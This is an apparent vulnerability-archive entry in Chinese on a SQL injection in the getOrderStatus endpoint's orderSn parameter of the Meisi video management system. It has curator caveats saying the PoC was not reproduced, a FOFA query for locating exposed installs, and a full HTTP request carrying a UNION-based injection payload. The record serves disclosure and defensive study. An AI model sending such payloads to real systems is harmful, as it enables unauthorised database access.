---
source: "wy876 漏洞文库"
title: "魅思视频管理系统 getOrderStatus orderSn SQL 注入"
product: "魅思视频管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，MySQL联合查询"
prerequisites: "未说明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/kv3dxee1t0tqrohb"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%AD%85%E6%80%9D%E8%A7%86%E9%A2%91%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E9%AD%85%E6%80%9D%E8%A7%86%E9%A2%91%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FgetOrderStatus%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"魅思-视频管理系统\""
id: "vw-39589c771141052685d7c058"
entity_id: "ve-39589c771141052685d7c058"
schema_version: "1"
---

# 魅思视频管理系统 getOrderStatus orderSn SQL 注入

## 条目说明

- 对象与具体问题：魅思视频管理系统；getOrderStatus orderSn SQLi
- 版本、配置及部署条件：版本未知，MySQL联合查询
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 载荷仅取版本且无响应/列映射，不能证明敏感信息范围
- 产品营销含视频!理错字，代码标go实际HTTP，版本只产品名
- 需说明订单查询鉴权及补丁，保留orderSn具体参数

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
魅思·视频 管理系统是一款集成了视频管理、用户管理、手机端应用封装等功能的综合性视频管理系统。该系统不仅以其强大的视频!理功能、灵活的用户管理机制、便捷的手机端应用封装功能以及高安全性和现代化的界面设计，成为了市场上备受关注的视频管理系统。无论是对于专业的视频内容创作者还是对于需要视频管理功能的企业和个人用户来说，都是一个值得考虑的选择。魅思视频管理系统getOrderStatus存在SQL注入漏洞

## 二、影响版本
+ 魅思视频管理系统

## 三、资产测绘
+ fofa`app="魅思-视频管理系统"`
+ 特征


## 四、漏洞复现
```http
POST /api/getOrderStatus HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
 
orderSn=') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(IFNULL(CAST(VERSION() AS NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL-- -
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kv3dxee1t0tqrohb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
